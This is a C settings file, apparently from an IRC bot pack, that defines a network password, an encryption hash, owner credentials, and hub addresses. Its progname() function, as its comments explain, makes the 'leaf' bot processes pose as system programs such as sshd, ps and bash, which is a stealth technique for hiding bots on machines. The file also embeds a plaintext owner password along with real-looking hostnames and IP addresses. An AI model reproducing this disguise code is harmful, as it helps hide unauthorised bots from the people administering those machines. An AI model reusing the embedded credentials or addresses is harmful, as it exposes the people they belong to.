#include <stdio.h>
#include <stdlib.h>

char netpass[15] = "kd8e3nchasd93dk"; //Just 15 random chars here.. (DO CHANGE)

//This pass will be used to encrypt files and other important things...
//Just MD5 some word and put the hash in here..
char thepass[33] = "5f4dcc3b5aa765d61d8327deb882cf99";



//These are programs the leaf binaries will spoof as
//Turning off spoofing is a bad idea.
char *progname() {
  switch (random() % 13) {
    case 0: return "-bash";
    case 1: return "ftp";
    case 2: return "/usr/sbin/sshd";
    case 3: return "man";
    case 4: return "pine";
    case 5: return "bash";
    case 6: return "top";
    case 7: return "last";
    case 8: return "w";
    case 9: return "ps ux";
    case 10: return "bash";
    case 11: return "./psybnc";
    case 12: return "BitchX";
  }
  return "";
}

//dcc command prefix, usually is "."
char    dcc_prefix[1] = "!";        /* Defines the command prefix */

//Don't edit these two
char owners[2048] = "";
char hubs[2048] = "";

void init_settings() {
/* I put the owner/hubs here, because I don't need to encrypt them this way.
 * and adding code to encrypt them into the binary like ghost does would take
 * too much space and time, and I don't feel it is needed.
 * You can list an infinite amount of hosts and owners/hubs.
 * Be sure to read through this and comments below before attempting to
 * edit the initial strings.
 * Proper syntax, (NOTE THE COMMAS, SLASHES, AND THE SPACING.):


//By "ip/hostname" I mean ip OR hostname, I highly recommend setting up dns for your hub with a hostname.

char t_owners[2048] = "\
nick pass *!u@host *!u@ip *!u@host *!u@host *!u@ip,\
nick pass *!u@host\
";
char t_hubs[2048] = "\
hubnick ip/hostname port 1 username username,\
hubnick2 ip/hostname port 2 username username,\
hubnick3 ip/hostname port 3 username username\
";

 * Give your main hub the number 1...
 * The order of the hubs makes no difference, but be sure to give each
 * bot a unique number, starting from 1 and not skipping any numbers.
 * See the example below for what username is.
 *
 * Also do not put a comma at the end of the last entry for both hubs/owners.
 *
 */

/* IT IS IMPERATIVE TO ADD THE TRAILING COMMA AND SLASH CORRECTLY */


//change these according to the above syntax.
char t_owners[2048] = "\
bryan Pass1234 *!bryan@botpack.net *!bryan@ip68-8-80-38.sd.sd.cox.net,\
";

/* I use the username 'bryan' and '~sbp' because the shell login is bryan
 * but there is no identd running, so I include both.
 */
char t_hubs[2048] = "\
hub 66.252.27.116 9227 1 shatow,\
war war.botpack.net 9227 2 bryan ~war\
";

/* ------ DO NOT EDIT ------ */
  sprintf(owners, "%s", t_owners);
  sprintf(hubs, "%s", t_hubs);
}
